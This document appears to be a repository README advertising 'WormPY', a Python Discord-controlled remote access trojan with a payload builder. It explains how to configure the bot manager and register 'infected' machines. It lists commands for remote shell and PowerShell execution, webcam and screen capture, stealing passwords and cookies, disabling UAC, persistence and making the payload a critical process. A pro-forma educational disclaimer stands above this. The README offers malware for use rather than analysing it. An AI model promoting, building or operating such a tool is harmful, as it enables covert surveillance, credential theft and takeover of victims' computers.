# WormPY-discord-rat
Python discord rat with 20+ commands, comes with builder

**WARNING:** 
This Remote Access Tool (RAT) is intended for educational and ethical purposes only.  
Unauthorized use or distribution of this software is illegal and may result in severe penalties.  
Use responsibly and with explicit permission from the target system owner.

**DISCLAIMER:**
I am NOT responsible for any misuse, damage, or legal consequences caused by this software.  
This tool is provided "as is" for educational and authorized testing purposes only.  
Use at your own risk and always obtain proper permission before accessing any system.

**Usage**
The bot-manager has to be running for clients to connect to the discord bot. There is no builder yet for the bot-manager, you will manually have to insert your guild id and bot token.
When a client runs the payload the bot-manager will send a log into the rat-log channel something like !register example, this is the commmand you wanna run to generate the channel for the infected system.
There is no prefix for commands. The bot-manager just listen for commands like "screenshot" directly.

**Available Commands**
            "- `pwd` : Show current working directory\n"
            "- `cd <path>` : Change directory\n"
            "- `ls` : List files in current directory\n"
            "- `cmd <command>` : Run shell command\n"
            "- `ps <command>` : Run PowerShell command\n"
            "- `screenshot` : Take a screenshot\n"
            "- `webcam` : Capture image from webcam\n"
            "- `upload <filename>` : Upload a file (attach file to message)\n"
            "- `download <filename>` : Download a file\n"
            "- `critical` : Make payload critical process\n"
            "- `grabpasswords` : Steal user passwords\n"
            "- `grabcookies` : Steal user cookies\n"
            "- `listprocs` : List current running rats\n"
            "- `killrat` : Kill PID-specified rat process\n"
            "- `stream` : Start streaming screenshots\n"
            "- `disableuac` : Disable UAC permanently\n"
            "- `enableuac` : Enable UAC permanently\n"
            "- `stopstream` : Stop streaming screenshots\n"
            "- `persistpayload` : Add payload persistence\n"
            "- `unpersistpayload` : Remove payload persistence\n"
            "- `getclipboard` : Retrieve the contents of the clipboard\n"
            "- `setclipboard <text>` : Set the contents of the clipboard to specified text\n"
